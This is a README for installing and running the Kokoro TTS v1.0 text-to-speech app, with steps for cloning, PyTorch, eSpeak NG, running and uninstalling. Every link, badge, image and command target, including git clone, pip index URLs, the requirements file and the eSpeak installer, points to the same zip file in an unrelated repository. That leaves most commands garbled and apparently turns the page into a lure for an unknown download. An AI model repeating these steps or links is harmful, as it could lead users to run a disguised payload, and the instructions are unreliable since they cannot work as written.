# Run Kokoro TTS V1.0

[![Open In Colab](https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip)](https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip) <br>
[![HuggingFace Space Demo](https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip🤗-Space%20demo-yellow)](https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip)

Alternative ways to use Kokoro-TTS [kokoro-onnx](https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip), [Kokoro-FastAPI](https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip), [kokoro](https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip)

![app](https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip)


## Installation

### Prerequisites
- At least Python 3.10
- Git
- (Optional) Virtual Environment for dependency isolation

### Steps to Install and Run

1. **Clone the Repository**
   ```sh
   git clone https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip
   cd kokoro_v1
   ```

2. **(Optional) Create and Activate a Virtual Environment**
   - **Windows:**
     ```sh
     python -m venv myenv
     myenv\Scripts\activate
     ```
   - **Mac/Linux:**
     ```sh
     python3 -m venv myenv
     source myenv/bin/activate
     ```

3. **Install PyTorch**
- **Forcefully install Torch with CUDA. If you did not, then https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip will install the CPU version [It's happening with my system.]**
  - Check CUDA Version (for GPU setup):
    ```bash
    nvcc --version
    ```
    Find your CUDA version example ```11.8```

  - Visit [PyTorch Get Started](https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip) and install the version compatible with your CUDA setup.:<br>
    - For CUDA 11.8:
    ```
    pip install torch  --index-url https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip
    ```
    - For CUDA 12.1:
    ```
    pip install torch  --index-url https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip
    ```
    - For CUDA 12.4:
    ```
    pip install torch  --index-url https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip
    ```
    
4. **Install Dependencies**
   - **Windows/Mac/Linux:**
     ```sh
     pip install -r https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip
     ```



---

4. **Install eSpeak NG**

- **For Windows:**
  1. Download the eSpeak NG 1.50 release from the [eSpeak NG GitHub Releases](https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip). [Or, You can try eSpeak NG latest Version]
  2. Locate and download the file named **`https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip`**.
  3. Run the installer and follow the installation steps. Ensure that you install eSpeak NG in the default directory:
     ```
     C:\Program Files\eSpeak NG
     ```
     > **Note:** This default path is required for the application to locate eSpeak NG properly.

- **For Linux:**
  1. Open your terminal.
  2. Install eSpeak NG using the following command:
     ```bash
     sudo apt-get -qq -y install espeak-ng > /dev/null 2>&1
     ```
     > **Note:** This command suppresses unnecessary output for a cleaner installation process.

---

5. **Run the Application**<br>
   If you used a virtual environment, make sure you enabled it.
   - **Windows/Mac/Linux:**
     ```sh
     python https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip
     ```
   Or,<br>
   ```
   python https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip
   ```
   Then, double-click on `https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip` (Windows) to execute the script.
<br>

6. **Use Kokoko TTS Gradio app as an API in your other project:**  
   Check out ```https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip``` Code

###### Uninstallation Guide for Kokoro v1.0

##### If You Used a Virtual Environment:
1. Simply delete the `kokoro_v1` folder from your project directory.

##### If You Did Not Use a Virtual Environment:
1. Inside the `kokoro_v1` directory, run the following command to uninstall dependencies:
   ```bash
   pip uninstall -r https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip
   ```
2. Uninstall PyTorch:
   ```bash
   pip uninstall torch
   ```
##### To clear the HuggingFace cache models:
   - Navigate to `C:\Users\<username>\.cache\huggingface\hub`
   - Delete the contents of the `hub` folder.
That's it! You've successfully removed everything.






## License
[Kokoro model](https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip) is licensed under the [Apache License 2.0]
## Credits
[Kokoro HuggingFace](https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip)
